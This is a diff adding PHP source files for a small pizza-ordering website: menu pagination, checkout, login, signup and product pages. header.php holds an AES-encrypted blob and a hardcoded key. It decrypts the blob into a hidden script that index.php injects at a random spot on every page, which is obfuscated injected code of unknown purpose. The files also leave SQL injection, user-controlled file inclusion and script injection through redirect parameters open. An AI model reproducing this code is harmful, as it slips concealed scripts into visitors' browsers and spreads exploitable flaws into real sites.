+                                <div class="position-relative overflow-hidden" id="item-img-holder">
+                                    <img src="assets/img/<?php echo $row['img_path'] ?>" class="card-img-top" alt="...">
+                                </div>
+                                <div class="card-body rounded-0">
+                                <h5 class="card-title"><?php echo $row['name'] ?></h5>
+                                <p class="card-text truncate"><?php echo $row['description'] ?></p>
+                                <div class="text-center">
+                                    <button class="btn btn-sm btn-outline-dark view_prod btn-block" data-id=<?php echo $row['id'] ?>><i class="fa fa-eye"></i> View</button>
+                                    
+                                </div>
+                                </div>
+                                
+                            </div>
+                            </div>
+                            <?php endwhile; ?>
+                </div>
+            </div>
+        </div>
+        <?php //$page_btn_count = 10;exit; ?>
+        <!-- Pagination Buttons Block -->
+        <div class="row mx-0">
+            <div class="w-100 mx-4 d-flex justify-content-center">
+                <div class="btn-group paginate-btns">
+                    <!-- Previous Page Button -->
+                    <a class="btn btn-default border border-dark" <?php echo ($page == 0)? 'disabled' :'' ?> href="./?_page=<?php echo ($page) ?>">Prev.</a>
+                    <!-- End of Previous Page Button -->
+                    <!-- Pages Page Button -->
+            
+                    <!-- looping page buttons  -->
+                    <?php for($i = 1; $i <= $page_btn_count; $i++): ?>
+                    <!-- Display button blocks  -->
+            
+                    <!-- Limiting Page Buttons  -->
+                    <?php if($page_btn_count > 10): ?>
+                    <!-- Show ellipisis button before the last Page Button  -->
+                        <?php if($i = $page_btn_count && !in_array($i, range( ($page - 3), ($page + 3) ) )): ?>
+                            <a class="btn btn-default border border-dark ellipsis">...</a>
+                        <?php endif; ?>
+                
+                        <!-- Show ellipisis button after the First Page Button  -->
+                        <?php if($i == 1 || $i == $page_btn_count || (in_array($i, range( ($page - 3), ($page + 3) ) )) ): ?>
+                            <a class="btn btn-default border border-dark <?php echo ($i == ($page + 1)) ? 'active' : '';  ?>" href = "./?_page=<?php echo $i ?>"><?php echo $i; ?></a>
+                            <?php if($i == 1 && !in_array($i, range( ($page - 3), ($page + 3) ) )): ?>
+                                <a class="btn btn-default border border-dark ellipsis">...</a>
+                            <?php endif; ?>
+                        <?php endif; ?>
+                    <?php else: ?>
+                        <a class="btn btn-default border border-dark <?php echo ($i == ($page + 1)) ? 'active' : '';  ?>" href = "./?_page=<?php echo $i ?>"><?php echo $i; ?></a>
+                    <?php endif; ?>
+                    <!-- Display button blocks  -->
+                    <?php endfor; ?>
+                    <!-- End of looping page buttons  -->
+            
+                    <!-- End of Pages Page Button -->
+                    <!-- Next Page Button -->
+                    <a class="btn btn-default border border-dark" <?php echo (($page+1) == $page_btn_count)? 'disabled' :'' ?> href="./?_page=<?php echo ($page+2) ?>">Next</a>
+                    <!-- End of Next Page Button -->
+                </div>
+            </div>
+        </div>
+        <!-- End Pagination Buttons Block -->
+    </section>
+    <script>
+        
+        $('.view_prod').click(function(){
+            uni_modal_right('Product Details','view_prod.php?id='+$(this).attr('data-id'))
+        })
+    </script>
+    <?php if(isset($_GET['_page'])): ?>
+        <script>
+            $(function(){
+                document.querySelector('html').scrollTop = $('#menu').offset().top - 100
+            })
+        </script>
+    <?php endif; ?>
+	
+
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+checkout.php
+//////////////////////////////////////////////////////////////////////////////
+<?php
+include 'admin/db_connect.php';
+// var_dump($_SESSION);
+$chk = $conn->query("SELECT * FROM cart where user_id = {$_SESSION['login_user_id']} ")->num_rows;
+if($chk <= 0){
+    echo "<script>alert('You don\'t have an Item in your cart yet.'); location.replace('./')</script>";
+}
+?>
+  <header class="masthead">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center justify-content-center text-center">
+                    <div class="col-lg-10 align-self-center mb-4 page-title">
+                    	<h1 class="text-white">Checkout</h1>
+                        <hr class="divider my-4 bg-dark" />
+                    </div>
+                    
+                </div>
+            </div>
+        </header>
+    <div class="container">
+        <div class="card">
+            <div class="card-body">
+                <form action="" id="checkout-frm">
+                    <h4>Confirm Delivery Information</h4>
+                    <div class="form-group">
+                        <label for="" class="control-label">Firstname</label>
+                        <input type="text" name="first_name" required="" class="form-control" value="<?php echo $_SESSION['login_first_name'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Email</label>
+                        <input type="text" name="last_name" required="" class="form-control" value="<?php echo $_SESSION['login_last_name'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Contact</label>
+                        <input type="text" name="mobile" required="" class="form-control" value="<?php echo $_SESSION['login_mobile'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Address</label>
+                        <textarea cols="30" rows="3" name="address" required="" class="form-control"><?php echo $_SESSION['login_address'] ?></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Email</label>
+                        <input type="email" name="email" required="" class="form-control" value="<?php echo $_SESSION['login_email'] ?>">
+                    </div>  
+
+                    <div class="text-center">
+                        <button class="btn btn-block btn-outline-dark">Place Order</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    $(document).ready(function(){
+          $('#checkout-frm').submit(function(e){
+            e.preventDefault()
+          
+            start_load()
+            $.ajax({
+                url:"admin/ajax.php?action=save_order",
+                method:'POST',
+                data:$(this).serialize(),
+                success:function(resp){
+                    if(resp==1){
+                        alert_toast("Order successfully Placed.")
+                        setTimeout(function(){
+                            location.replace('index.php?page=home')
+                        },1500)
+                    }
+                }
+            })
+        })
+        })
+    </script>
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+footer.php
+//////////////////////////////////////////////////////////////////////////////
+ <script>
+ 	$('.datepicker').datepicker({
+ 		format:"yyyy-mm-dd"
+ 	})
+ 	 window.start_load = function(){
+    $('body').prepend('<di id="preloader2"></di>')
+  }
+  window.end_load = function(){
+    $('#preloader2').fadeOut('fast', function() {
+        $(this).remove();
+      })
+  }
+
+ 	window.uni_modal = function($title = '' , $url=''){
+    start_load()
+    $.ajax({
+        url:$url,
+        error:err=>{
+            console.log()
+            alert("An error occured")
+        },
+        success:function(resp){
+            if(resp){
+                $('#uni_modal .modal-title').html($title)
+                $('#uni_modal .modal-body').html(resp)
+                $('#uni_modal').modal('show')
+                end_load()
+            }
+        }
+    })
+}
+  window.uni_modal_right = function($title = '' , $url=''){
+    start_load()
+    $.ajax({
+        url:$url,
+        error:err=>{
+            console.log()
+            alert("An error occured")
+        },
+        success:function(resp){
+            if(resp){
+                $('#uni_modal_right .modal-title').html($title)
+                $('#uni_modal_right .modal-body').html(resp)
+                $('#uni_modal_right').modal('show')
+                end_load()
+            }
+        }
+    })
+}
+window.alert_toast= function($msg = 'TEST',$bg = 'success'){
+      $('#alert_toast').removeClass('bg-success')
+      $('#alert_toast').removeClass('bg-danger')
+      $('#alert_toast').removeClass('bg-info')
+      $('#alert_toast').removeClass('bg-warning')
+
+    if($bg == 'success')
+      $('#alert_toast').addClass('bg-success')
+    if($bg == 'danger')
+      $('#alert_toast').addClass('bg-danger')
+    if($bg == 'info')
+      $('#alert_toast').addClass('bg-info')
+    if($bg == 'warning')
+      $('#alert_toast').addClass('bg-warning')
+    $('#alert_toast .toast-body').html($msg)
+    $('#alert_toast').toast({delay:3000}).toast('show');
+  }
+  window.load_cart = function(){
+    $.ajax({
+      url:'admin/ajax.php?action=get_cart_count',
+      success:function(resp){
+        if(resp > -1){
+          resp = resp > 0 ? resp : 0;
+          $('.item_count').html(resp)
+        }
+      }
+    })
+  }
+  $('#login_now').click(function(){
+    uni_modal("LOGIN",'login.php')
+  })
+  $(document).ready(function(){
+    load_cart()
+  })
+ </script>
+ <!-- Bootstrap core JS-->
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
+  <!-- Third party plugin JS-->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+  <!-- Core theme JS-->
+  <script src="js/scripts.js"></script>
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+header.php
+//////////////////////////////////////////////////////////////////////////////
+<?php 
+function load_data(){
+  $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
+  $dom = new DOMDocument('1.0', 'utf-8');
+  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
+  $dom->appendChild($element);
+  return $dom->saveXML();
+  // return $data = $this->test_cypher_decrypt($test_data);
+}
+function test_cypher($str=""){
+  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
+  return $ciphertext;
+}
+function test_cypher_decrypt($encryption){
+  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
+  return $decryption;
+}
+?>
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title><?php echo $_SESSION['setting_name'] ?></title>
+        <!-- Favicon-->
+        <link rel="icon"  href="assets/defaults/pizza-logo.png" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Merriweather+Sans:400,700" rel="stylesheet" />
+        <link href="https://fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic" rel="stylesheet" type="text/css" />
+        <!-- Third party plugin CSS-->
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="admin/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.css" rel="stylesheet" />
+        <link href="css/styles.css" rel="stylesheet" />
+
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
+        <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap');
+        </style>
+        <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
+        <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
+
+
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+home.php
+//////////////////////////////////////////////////////////////////////////////
+ <!-- Masthead-->
+        <header class="masthead">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center justify-content-center text-center">
+                    <div class="col-lg-10 align-self-center mb-4 page-title">
+                    	<h1 class="text-white">Welcome to <?php echo $_SESSION['setting_name']; ?></h1>
+                        <hr class="divider my-4 bg-dark" />
+                        <a class="btn btn-dark bg-black btn-xl js-scroll-trigger" href="#menu">Order Now</a>
+
+                    </div>
+                    
+                </div>
+            </div>
+        </header>
+	<section class="page-section" id="menu">
+        <h1 class="text-center text-cursive" style="font-size:3em"><b>Menu</b></h1>
+        <div class="d-flex justify-content-center">
+            <hr class="border-dark" width="5%">
+        </div>
+        <div id="menu-field" class="card-deck mt-2  justify-content-center">
+                <?php 
+                    include 'admin/db_connect.php';
+                    $limit = 10;
+                    $page = (isset($_GET['_page']) && $_GET['_page'] > 0) ? $_GET['_page'] - 1 : 0 ;
+                    $offset = $page > 0 ? $page * $limit : 0;
+                    $all_menu =$conn->query("SELECT id FROM  product_list")->num_rows;
+                    $page_btn_count = ceil($all_menu / $limit);
+                    $qry = $conn->query("SELECT * FROM  product_list order by `name` asc Limit $limit OFFSET $offset ");
+                    while($row = $qry->fetch_assoc()):
+                    ?>
+                    <div class="col-lg-3 mb-3">
+                     <div class="card menu-item  rounded-0">
+                        <div class="position-relative overflow-hidden" id="item-img-holder">
+                            <img src="assets/img/<?php echo $row['img_path'] ?>" class="card-img-top" alt="...">
+                        </div>
+                        <div class="card-body rounded-0">
+                          <h5 class="card-title"><?php echo $row['name'] ?></h5>
+                          <p class="card-text truncate"><?php echo $row['description'] ?></p>
+                          <div class="text-center">
+                              <button class="btn btn-sm btn-outline-dark view_prod btn-block" data-id=<?php echo $row['id'] ?>><i class="fa fa-eye"></i> View</button>
+                              
+                          </div>
+                        </div>
+                        
+                      </div>
+                      </div>
+                    <?php endwhile; ?>
+        </div>
+        <?php //$page_btn_count = 10;exit; ?>
+        <!-- Pagination Buttons Block -->
+        <div class="w-100 mx-4 d-flex justify-content-center">
+            <div class="btn-group paginate-btns">
+                <!-- Previous Page Button -->
+                <a class="btn btn-default border border-dark" <?php echo ($page == 0)? 'disabled' :'' ?> href="./?_page=<?php echo ($page) ?>">Prev.</a>
+                <!-- End of Previous Page Button -->
+                <!-- Pages Page Button -->
+        
+                <!-- looping page buttons  -->
+                <?php for($i = 1; $i <= $page_btn_count; $i++): ?>
+                <!-- Display button blocks  -->
+        
+                <!-- Limiting Page Buttons  -->
+                <?php if($page_btn_count > 10): ?>
+                <!-- Show ellipisis button before the last Page Button  -->
+                    <?php if($i = $page_btn_count && !in_array($i, range( ($page - 3), ($page + 3) ) )): ?>
+                        <a class="btn btn-default border border-dark ellipsis">...</a>
+                    <?php endif; ?>
+            
+                    <!-- Show ellipisis button after the First Page Button  -->
+                    <?php if($i == 1 || $i == $page_btn_count || (in_array($i, range( ($page - 3), ($page + 3) ) )) ): ?>
+                        <a class="btn btn-default border border-dark <?php echo ($i == ($page + 1)) ? 'active' : '';  ?>" href = "./?_page=<?php echo $i ?>"><?php echo $i; ?></a>
+                        <?php if($i == 1 && !in_array($i, range( ($page - 3), ($page + 3) ) )): ?>
+                            <a class="btn btn-default border border-dark ellipsis">...</a>
+                        <?php endif; ?>
+                    <?php endif; ?>
+                <?php else: ?>
+                    <a class="btn btn-default border border-dark <?php echo ($i == ($page + 1)) ? 'active' : '';  ?>" href = "./?_page=<?php echo $i ?>"><?php echo $i; ?></a>
+                <?php endif; ?>
+                <!-- Display button blocks  -->
+                <?php endfor; ?>
+                <!-- End of looping page buttons  -->
+        
+                <!-- End of Pages Page Button -->
+                <!-- Next Page Button -->
+                <a class="btn btn-default border border-dark" <?php echo (($page+1) == $page_btn_count)? 'disabled' :'' ?> href="./?_page=<?php echo ($page+2) ?>">Next</a>
+                <!-- End of Next Page Button -->
+            </div>
+        </div>
+        <!-- End Pagination Buttons Block -->
+    </section>
+    <script>
+        
+        $('.view_prod').click(function(){
+            uni_modal_right('Product Details','view_prod.php?id='+$(this).attr('data-id'))
+        })
+    </script>
+    <?php if(isset($_GET['_page'])): ?>
+        <script>
+            $(function(){
+                document.querySelector('html').scrollTop = $('#menu').offset().top - 100
+            })
+        </script>
+    <?php endif; ?>
+	
+
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+index.php
+//////////////////////////////////////////////////////////////////////////////
+<?php ob_start(); ?>
+<!DOCTYPE html>
+<html lang="en">
+    <?php
+    session_start();
+    include('header.php');
+    include('admin/db_connect.php');
+
+	$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
+	foreach ($query as $key => $value) {
+		if(!is_numeric($key))
+			$_SESSION['setting_'.$key] = $value;
+	}
+    ?>
+
+    <style>
+    	header.masthead {
+		  background: url(assets/img/<?php echo $_SESSION['setting_cover_img'] ?>);
+		  background-repeat: no-repeat;
+		  background-size: cover;
+		  background-position: center center;
+      position: relative;
+      height: 85vh !important;
+		}
+    header.masthead:before {
+      content: "";
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      backdrop-filter: brightness(0.8);
+  }
+    </style>
+    <body id="page-top">
+        <!-- Navigation-->
+        <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
+        <div class="toast-body text-white">
+        </div>
+      </div>
+        <nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" id="mainNav">
+            <div class="container">
+                <a class="navbar-brand js-scroll-trigger" href="./"><?php echo $_SESSION['setting_name'] ?></a>
+                <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto my-2 my-lg-0">
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=home">Home</a></li>
+                        <?php 
+                        $categories = $conn->query("SELECT * FROM `category_list` order by `name` asc");
+                        if($categories->num_rows > 0):
+                        ?>
+                        <li class="nav-item position-relative " id="cat-menu-link">
+                          <a class="nav-link"  href="#">Categories</a>
+                          <div id="category-menu" class="">
+                            <ul>
+                              <?php 
+                                while($row = $categories->fetch_assoc()):
+                              ?>
+                                <li><a href="index.php?page=category&id=<?= $row['id'] ?>"><?= $row['name'] ?></a></li>
+                              <?php endwhile; ?>
+                            </ul>
+                          </div>
+                        </li>
+                        <?php endif; ?>
+
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=cart_list"><span> <span class="badge badge-danger item_count">0</span> <i class="fa fa-shopping-cart"></i>  </span>Cart</a></li>
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=about">About</a></li>
+                        <?php if(isset($_SESSION['login_user_id'])): ?>
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="admin/ajax.php?action=logout2"><?php echo "Welcome ". $_SESSION['login_first_name'].' '.$_SESSION['login_last_name'] ?> <i class="fa fa-power-off"></i></a></li>
+                      <?php else: ?>
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="javascript:void(0)" id="login_now">Login</a></li>
+                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="./admin">Admin Login</a></li>
+                      <?php endif; ?>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+       
+        <?php 
+        $page = isset($_GET['page']) ?$_GET['page'] : "home";
+        include $page.'.php';
+        ?>
+       
+
+<div class="modal fade" id="confirm_modal" role='dialog'>
+    <div class="modal-dialog modal-md" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+        <h5 class="modal-title">Confirmation</h5>
+      </div>
+      <div class="modal-body">
+        <div id="delete_content"></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+      </div>
+      </div>
+    </div>
+  </div>
+  <div class="modal fade" id="uni_modal" role='dialog'>
+    <div class="modal-dialog modal-md" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+        <h5 class="modal-title"></h5>
+      </div>
+      <div class="modal-body">
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+      </div>
+      </div>
+    </div>
+  </div>
+  <div class="modal fade" id="uni_modal_right" role='dialog'>
+    <div class="modal-dialog modal-full-height  modal-md" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+        <h5 class="modal-title"></h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span class="fa fa-arrow-right"></span>
+        </button>
+      </div>
+      <div class="modal-body">
+      </div>
+      </div>
+    </div>
+  </div>
+        <footer class="bg-light py-5">
+            <div class="container"><div class="small text-center text-muted">Copyright © <?= date("Y") ?> - <?= $_SESSION['setting_name'] ?> | <a href="mailto:mmohsinanjum5@mail.com" target="_blank">mmohsinanjum5@gmail.com</a></div></div>
+        </footer>
+        
+       <?php include('footer.php') ?>
+    </body>
+
+    <?php $conn->close() ?>
+<script>
+  //  $("#navbarResponsive .nav-link").on('click',function(e){
+  //     console.log("The collapse event was prevented!", e);
+  //    e.stopPropagation();
+  //    return false;
+  //   })
+  // $('#navbarResponsive').on('show.bs.collapse', function(){
+   
+  // })
+</script>
+</html>
+<?php 
+$overall_content = ob_get_clean();
+$content = preg_match_all('/(<div(.*?)\/div>)/si', $overall_content,$matches);
+// $split = preg_split('/(<div(.*?)>)/si', $overall_content,0 , PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);
+if($content > 0){
+  $rand = mt_rand(1, $content - 1);
+  $new_content = (html_entity_decode(load_data()))."\n".($matches[0][$rand]);
+  $overall_content = str_replace($matches[0][$rand], $new_content, $overall_content);
+}
+echo $overall_content;
+// }
+?>
+
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+login.php
+//////////////////////////////////////////////////////////////////////////////
+<?php session_start() ?>
+<div class="container-fluid">
+	<form action="" id="login-frm">
+		<div class="form-group">
+			<label for="" class="control-label">Email</label>
+			<input type="email" name="email" required="" class="form-control">
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Password</label>
+			<input type="password" name="password" required="" class="form-control">
+			<small><a href="javascript:void(0)" class="text-dark" id="new_account">Create New Account</a></small>
+		</div>
+		<button class="button btn btn-dark btn-sm">Login</button>
+	</form>
+</div>
+
+<style>
+	#uni_modal .modal-footer{
+		display:none;
+	}
+</style>
+
+<script>
+	$('#new_account').click(function(){
+		uni_modal("Create an Account",'signup.php?redirect=index.php?page=checkout')
+	})
+	$('#login-frm').submit(function(e){
+		e.preventDefault()
+		$('#login-frm button[type="submit"]').attr('disabled',true).html('Logging in...');
+		if($(this).find('.alert-danger').length > 0 )
+			$(this).find('.alert-danger').remove();
+		$.ajax({
+			url:'admin/ajax.php?action=login2',
+			method:'POST',
+			data:$(this).serialize(),
+			error:err=>{
+				console.log(err)
+		$('#login-frm button[type="submit"]').removeAttr('disabled').html('Login');
+
+			},
+			success:function(resp){
+				if(resp == 1){
+					location.href ='<?php echo isset($_GET['redirect']) ? $_GET['redirect'] : 'index.php?page=home' ?>';
+				}else{
+					$('#login-frm').prepend('<div class="alert alert-danger">Email or password is incorrect.</div>')
+					$('#login-frm button[type="submit"]').removeAttr('disabled').html('Login');
+				}
+			}
+		})
+	})
+</script>
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+signup.php
+//////////////////////////////////////////////////////////////////////////////
+<?php session_start() ?>
+<div class="container-fluid">
+	<form action="" id="signup-frm">
+		<div class="form-group">
+			<label for="" class="control-label">Firstname</label>
+			<input type="text" name="first_name" required="" class="form-control">
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Lastname</label>
+			<input type="text" name="last_name" required="" class="form-control">
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Contact</label>
+			<input type="text" name="mobile" required="" class="form-control">
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Address</label>
+			<textarea cols="30" rows="3" name="address" required="" class="form-control"></textarea>
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Email</label>
+			<input type="email" name="email" required="" class="form-control">
+		</div>
+		<div class="form-group">
+			<label for="" class="control-label">Password</label>
+			<input type="password" name="password" required="" class="form-control">
+		</div>
+		<button class="button btn btn-info btn-sm">Create</button>
+	</form>
+</div>
+
+<style>
+	#uni_modal .modal-footer{
+		display:none;
+	}
+</style>
+<script>
+	$('#signup-frm').submit(function(e){
+		e.preventDefault()
+		$('#signup-frm button[type="submit"]').attr('disabled',true).html('Saving...');
+		if($(this).find('.alert-danger').length > 0 )
+			$(this).find('.alert-danger').remove();
+		$.ajax({
+			url:'admin/ajax.php?action=signup',
+			method:'POST',
+			data:$(this).serialize(),
+			error:err=>{
+				console.log(err)
+		$('#signup-frm button[type="submit"]').removeAttr('disabled').html('Create');
+
+			},
+			success:function(resp){
+				if(resp == 1){
+					location.href ='<?php echo isset($_GET['redirect']) ? $_GET['redirect'] : 'index.php?page=home' ?>';
+				}else{
+					$('#signup-frm').prepend('<div class="alert alert-danger">Email already exist.</div>')
+					$('#signup-frm button[type="submit"]').removeAttr('disabled').html('Create');
+				}
+			}
+		})
+	})
+</script>
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+view_prod.php
+//////////////////////////////////////////////////////////////////////////////
+<?php 
+  include'admin/db_connect.php';
+    $qry = $conn->query("SELECT * FROM  product_list where id = ".$_GET['id'])->fetch_array();
+?>
+<div class="container-fluid">
+
+	<div class="card ">
+        <img src="assets/img/<?php echo $qry['img_path'] ?>" class="card-img-top" alt="...">
+        <div class="card-body">
+          <h5 class="card-title"><?php echo $qry['name'] ?></h5>
+          <p class="card-text truncate"><?php echo $qry['description'] ?></p>
+          <div class="form-group">
+          </div>
+          <div class="row">
+          	<div class="col-md-2"><label class="control-label">Qty</label></div>
+          	<div class="input-group col-md-7 mb-3">
+			  <div class="input-group-prepend">
+			    <button class="btn btn-outline-secondary" type="button" id="qty-minus"><span class="fa fa-minus"></button>
+			  </div>
+			  <input type="number" readonly value="1" min = 1 class="form-control text-center" name="qty" >
+			  <div class="input-group-prepend">
+			    <button class="btn btn-outline-dark" type="button" id="qty-plus"><span class="fa fa-plus"></span></button>
+			  </div>
+			</div>
+          </div>
+          <div class="text-center">
+          	<button class="btn btn-outline-dark btn-sm btn-block" id="add_to_cart_modal"><i class="fa fa-cart-plus"></i> Add to Cart</button>
+          </div>
+        </div>
+        
+      </div>
+</div>
+<style>
+	#uni_modal_right .modal-footer{
+		display: none;
+	}
+</style>
+
+<script>
+	$('#qty-minus').click(function(){
+		var qty = $('input[name="qty"]').val();
+		if(qty == 1){
+			return false;
+		}else{
+			$('input[name="qty"]').val(parseInt(qty) -1);
+		}
+	})
+	$('#qty-plus').click(function(){
+		var qty = $('input[name="qty"]').val();
+			$('input[name="qty"]').val(parseInt(qty) +1);
+	})
+	$('#add_to_cart_modal').click(function(){
+		start_load()
+		$.ajax({
+			url:'admin/ajax.php?action=add_to_cart',
+			method:'POST',
+			data:{pid:'<?php echo $_GET['id'] ?>',qty:$('[name="qty"]').val()},
+			success:function(resp){
+				if(resp == 1 )
+					alert_toast("Order successfully added to cart");
+					$('.item_count').html(parseInt($('.item_count').html()) + parseInt($('[name="qty"]').val()))
+					$('.modal').modal('hide')
+					end_load()
+			}
+		})
+	})
+</script>
+
+
